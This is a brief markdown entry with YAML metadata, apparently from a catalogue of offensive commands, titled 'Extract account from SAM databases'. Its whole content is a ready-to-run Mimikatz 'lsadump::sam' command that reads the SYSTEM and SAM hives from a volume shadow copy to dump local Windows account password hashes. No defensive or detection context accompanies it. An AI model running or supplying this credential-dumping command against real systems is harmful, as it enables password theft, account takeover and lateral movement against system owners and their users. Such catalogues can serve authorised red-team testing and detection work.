---
id: 4f11ae41-f634-444e-9b0a-ca92d134280d
name: Extract account from SAM databases
type: command
executor: bash
data: mimikatz> lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM
  /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
output: null
created_at: '2023-04-06T03:56:28.851575+00:00'
updated_at: '2023-04-10T20:37:52.895105+00:00'
---

# Extract account from SAM databases

```bash
mimikatz> lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
```


